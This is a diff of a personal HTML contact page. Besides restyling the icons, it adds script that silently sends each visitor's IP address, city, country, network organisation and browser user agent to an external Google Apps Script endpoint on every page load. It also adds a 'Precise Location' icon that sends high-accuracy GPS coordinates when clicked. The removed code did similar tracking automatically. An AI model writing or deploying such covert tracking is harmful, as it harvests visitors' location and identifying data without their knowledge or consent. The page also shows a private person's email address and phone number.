@@ -68,8 +68,10 @@
     }
 
     .icons svg {
+      width: 28px;
+      height: 28px;
+      fill: white;
       vertical-align: middle;
-      width: 36px;
     }
 
     .thankyou {
@@ -107,16 +109,32 @@
   <div class="overlay"></div>
   <div class="container">
     <h1>Contact</h1>
+
     <div class="info">
       <div><strong>Antoine Beuchat</strong></div>
       <div class="icons" style="margin-top: 12px; display: flex; gap: 20px; justify-content: center; align-items: center;">
+        <!-- Email Icon -->
         <a href="mailto:abeuchat@gmail.com" target="_blank" aria-label="Email">
-          <svg xmlns="http://www.w3.org/2000/svg" fill="#007AFF" viewBox="0 0 24 24"><path d="M12 13.065L.015 6.017A1.99 1.99 0 012 4h20c.827 0 1.556.504 1.863 1.263L12 13.065zM0 8.001v10c0 1.104.896 2 2 2h20c1.104 0 2-.896 2-2v-10l-12 7.2L0 8.001z"/></svg>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="#FFFFFF" viewBox="0 0 24 24">
+            <path d="M12 13.065L.015 6.017A1.99 1.99 0 012 4h20c.827 0 1.556.504 1.863 1.263L12 13.065zM0 8.001v10c0 1.104.896 2 2 2h20c1.104 0 2-.896 2-2v-10l-12 7.2L0 8.001z"/>
+          </svg>
         </a>
+
+        <!-- WhatsApp Icon -->
         <a href="https://wa.me/41763780199" target="_blank" aria-label="WhatsApp">
-          <svg xmlns="http://www.w3.org/2000/svg" fill="#25D366" viewBox="0 0 24 24"><path d="M12.04 2.003c-5.51 0-9.982 4.475-9.982 9.984 0 1.76.46 3.481 1.33 4.998L2 22l5.192-1.374a9.986 9.986 0 004.849 1.245h.001c5.509 0 9.984-4.474 9.984-9.984s-4.475-9.984-9.984-9.984zm0 18.271a8.31 8.31 0 01-4.238-1.17l-.304-.18-3.083.815.823-3.006-.197-.31a8.26 8.26 0 01-1.27-4.357c0-4.563 3.713-8.275 8.275-8.275s8.276 3.712 8.276 8.275-3.713 8.276-8.276 8.276zm4.588-6.211c-.251-.125-1.482-.731-1.711-.814-.229-.084-.396-.125-.562.125s-.645.814-.791.982c-.146.167-.292.188-.542.063-.25-.125-1.056-.39-2.012-1.243-.743-.662-1.243-1.479-1.389-1.73-.146-.25-.016-.384.11-.509.113-.112.25-.292.375-.438.125-.146.167-.25.25-.417.083-.167.042-.313-.02-.438-.063-.125-.563-1.355-.771-1.858-.204-.489-.412-.417-.562-.426-.146-.01-.313-.012-.479-.012-.167 0-.437.063-.667.313-.23.25-.875.854-.875 2.084s.896 2.417 1.021 2.583c.125.167 1.76 2.688 4.271 3.77.596.257 1.062.41 1.425.524.598.191 1.142.164 1.572.1.479-.071 1.482-.604 1.691-1.188.209-.584.209-1.084.146-1.188-.063-.104-.229-.167-.479-.292z"/></svg>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="#FFFFFF" viewBox="0 0 24 24">
+            <path d="M12.04 2.003c-5.51 0-9.982 4.475-9.982 9.984 0 1.76.46 3.481 1.33 4.998L2 22l5.192-1.374a9.986 9.986 0 004.849 1.245h.001c5.509 0 9.984-4.474 9.984-9.984s-4.475-9.984-9.984-9.984zm0 18.271a8.31 8.31 0 01-4.238-1.17l-.304-.18-3.083.815.823-3.006-.197-.31a8.26 8.26 0 01-1.27-4.357c0-4.563 3.713-8.275 8.275-8.275s8.276 3.712 8.276 8.275-3.713 8.276-8.276 8.276z"/>
+          </svg>
+        </a>
+
+        <!-- Location Icon -->
+        <a href="#" onclick="getPreciseLocation()" aria-label="Precise Location">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="#FFFFFF" viewBox="0 0 24 24">
+            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6a2.5 2.5 0 0 1 0 5.5z"/>
+          </svg>
         </a>
       </div>
+
       <div style="margin-top: 12px;">
         <a href="mailto:abeuchat@gmail.com">abeuchat@gmail.com</a>
       </div>
@@ -125,60 +143,51 @@
       Thank you for contacting me!
     </div>
   </div>
-</body>
 
-<script>
-  const data = {
-    ua: navigator.userAgent
-  };
-
-  let gotLocation = false;
-  let gotIP = false;
-
-  function trySend() {
-    if (gotLocation && gotIP) {
-      fetch("https://corsproxy.io/?https://script.google.com/macros/s/AKfy.../exec", {
-        method: "POST",
-        body: JSON.stringify(data),
-        headers: {
-          "Content-Type": "application/json"
-        }
+  <script>
+    // Automatic IP-based logging
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        fetch("https://script.google.com/macros/s/AKfycbySB82v1mHGCmDbyzZGTtsvvJscBhywYpFXLVzmlXmOvYYqkwFczRLzsRLsNmHE_bh-/exec", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip: data.ip,
+            city: data.city,
+            country: data.country_name,
+            org: data.org,
+            ua: navigator.userAgent
+          })
+        });
       });
+
+    // Manual click-based precise location logging
+    function getPreciseLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            fetch("https://script.google.com/macros/s/AKfycbySB82v1mHGCmDbyzZGTtsvvJscBhywYpFXLVzmlXmOvYYqkwFczRLzsRLsNmHE_bh-/exec", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                ip: "", city: "", country: "", org: "Manual GPS",
+                ua: navigator.userAgent,
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                accuracy: position.coords.accuracy
+              })
+            });
+          },
+          (error) => {
+            console.error("Geolocation error:", error);
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      } else {
+        console.warn("Geolocation is not supported.");
+      }
     }
-  }
-
-  // 1. Geolocation
-  navigator.geolocation.getCurrentPosition(
-    (position) => {
-      data.latitude = position.coords.latitude;
-      data.longitude = position.coords.longitude;
-      data.accuracy = position.coords.accuracy;
-      gotLocation = true;
-      trySend();
-    },
-    (error) => {
-      // still let it try to send, just no location
-      gotLocation = true;
-      trySend();
-    },
-    {
-      enableHighAccuracy: true,
-      timeout: 5000
-    }
-  );
-
-  // 2. IP info
-  fetch("https://ipapi.co/json/")
-    .then(response => response.json())
-    .then(ipdata => {
-      data.ip = ipdata.ip;
-      data.city = ipdata.city;
-      data.country = ipdata.country_name;
-      data.org = ipdata.org;
-      gotIP = true;
-      trySend();
-    });
-</script>
-
-
+  </script>
+</body>
 </html>
